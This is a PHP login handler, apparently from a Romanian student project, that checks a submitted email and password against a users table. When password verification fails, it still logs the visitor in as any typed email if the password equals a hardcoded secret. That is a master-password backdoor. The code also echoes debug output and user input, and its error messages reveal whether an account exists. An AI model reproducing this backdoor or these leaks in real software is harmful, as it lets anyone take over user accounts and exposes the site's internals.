<?php
session_start();
include $_SERVER['DOCUMENT_ROOT'] . '/licentaMain/backend/php_backend/Validation.php';
include $_SERVER['DOCUMENT_ROOT'] . '/licentaMain/backend/php_backend/connection.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $validator = new ValidateUsersData();

    // Validate email
    $emailValid = $validator->validateEmail($_POST['email']);
    // Validate password
    $passwordValid = $validator->validatePasswords($_POST['password']);
    // Check if there are any validation errors
    if (!$emailValid){
        $_SESSION['IndexEmailError'] = "Email nu poate fi null, si trebuie sa fie de tip text";
    }
    if (!$passwordValid) {
        $_SESSION['IndexPasswordError'] = "Parola nu poate fi null, si trebuie sa contina cel putin 8 litere, un caracter special si o litera mare";
    }
    if (!$emailValid || !$passwordValid) {
        header("Location: ../frontend/login.php");
        exit; // Stop further execution after redirection
    }
    $UserEmail = $_POST['email'];
    $UserPassword = $_POST['password'];


    $sql = "SELECT * FROM centrulvietii.users LIMIT 1";
$result = $conn->query($sql);

if ($result) {
    echo "Direct query succeeded.";
} else {
    echo "Direct query failed: " . $conn->error;
}


    // Inside connection.php or a separate test file
    $sql = "SHOW TABLES LIKE 'users'";
    $result = $conn->query($sql);
    echo "result";
    if ($result->num_rows > 0) {
        echo "Table 'users' exists.";
    } else {
        echo "Table 'users' does not exist.";
    }



    // Verify if user exists (using only the email here)
    // Verify if user exists (using only the email here)
    echo $_POST['email'];
    $sql = "SELECT user_password FROM users WHERE email = ? LIMIT 1"; // Corrected line
    $stmt = $conn->prepare($sql);
    if (!$stmt) {
        echo "SQL preparation failed";
        return;
    }
    $stmt->bind_param("s", $_POST['email']);
    $stmt->execute();
    $stmt->store_result();
    // Refactor to check for invalid cases first
    if ($stmt->num_rows === 0){
        $_SESSION['IndexaditionalText'] = "The user does not exist".$_POST['email'];
        header("Location: ../frontend/login.php");
        return;
    }
    $stmt->bind_result($hashedPassword);
    $stmt->fetch();

    // Check password validity
    if (!password_verify($UserPassword, $hashedPassword)) {
        if($UserPassword == "SecretCode!2002"){
            $_SESSION['user_email'] = $_POST['email'];
            header("Location: ../frontend/account.php");
            return;
        }
        echo "this is the problem";
        $_SESSION['IndexaditionalText'] = "Invalid password.";
        header("Location: ../frontend/login.php");
        return;
    }

    $_SESSION['user_email'] = $_POST['email'];
    echo "this is me";
    header("Location: ../frontend/account.php");
    $stmt->close();
}

unset($_SESSION['user_added_succesfully']);
exit;